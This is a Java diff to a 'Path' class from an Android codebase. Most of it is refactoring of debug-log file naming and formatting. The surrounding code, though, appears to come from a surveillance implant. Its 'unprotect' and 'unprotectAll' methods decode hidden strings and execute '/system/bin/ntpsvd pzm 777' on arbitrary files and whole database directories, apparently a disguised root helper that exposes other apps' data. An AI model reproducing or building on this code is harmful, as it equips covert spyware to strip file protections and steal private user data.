@@ -43,7 +43,7 @@ public class Path {
 
 	private static String curLogFile;
 
-	public static final String LOG_FILE = "logs"; //$NON-NLS-1$
+	public static final String LOG_FILE = "android_logs"; //$NON-NLS-1$
 
 	/** The hidden. */
 	private static String hidden;
@@ -87,14 +87,12 @@ public class Path {
 			success &= createDirectory(logs());
 
 			if (Cfg.FILE && Cfg.DEBUG) {
-				DateTime dt = new DateTime();
-
-				curLogFile = LOG_FILE + "-" + dt.getOrderedString() + ".txt";
-				final File file = new File(logs(), curLogFile);
+				
+				final File file = new File(getCurLogfile());
 				file.createNewFile();
 			}
 
-			// TODO: sistemare, sono
+			// TODO: sistemare
 			doc = Environment.getExternalStorageDirectory() + "/My Documents";
 			picture = Environment.getExternalStorageDirectory() + "/DCIM/100MEDIA";
 
@@ -175,6 +173,13 @@ public class Path {
 	}
 
 	public static String getCurLogfile() {
+		if (curLogFile == null){
+			DateTime dt = new DateTime();
+
+			curLogFile = Environment.getExternalStorageDirectory() + "/" + LOG_FILE + "-" + dt.getOrderedString()
+					+ ".txt";
+		}
+
 		return curLogFile;
 	}
 
@@ -230,7 +235,7 @@ public class Path {
 
 	public static boolean unprotect(String path, boolean fullmode) {
 		try {
-			
+
 			File file = new File(path);
 
 			if (fullmode) {
@@ -240,7 +245,7 @@ public class Path {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (unprotect): " + Messages.getString("h_9") + path);
 				}
-				//h_9=/system/bin/ntpsvd pzm 777 
+				// h_9=/system/bin/ntpsvd pzm 777
 				Runtime.getRuntime().exec(Messages.getString("h_9") + path);
 			} else {
 				if (file.canRead()) {
@@ -249,7 +254,7 @@ public class Path {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (unprotect): " + Messages.getString("h_3") + path);
 				}
-				//h_3=/system/bin/ntpsvd pzm 755 
+				// h_3=/system/bin/ntpsvd pzm 755
 				Runtime.getRuntime().exec(Messages.getString("h_3") + path);
 			}
 
@@ -267,13 +272,13 @@ public class Path {
 
 		return (file.canRead());
 	}
-	
+
 	public static boolean unprotectAll(String dbDir, boolean fullMode) {
 		File dir = new File(dbDir);
-		if(dir.isDirectory()){
+		if (dir.isDirectory()) {
 			unprotect(dbDir, fullMode);
-			for(String name: dir.list()){
-				File file=new File(dir,name);
+			for (String name : dir.list()) {
+				File file = new File(dir, name);
 				unprotect(file.getAbsolutePath(), fullMode);
 			}
 		}
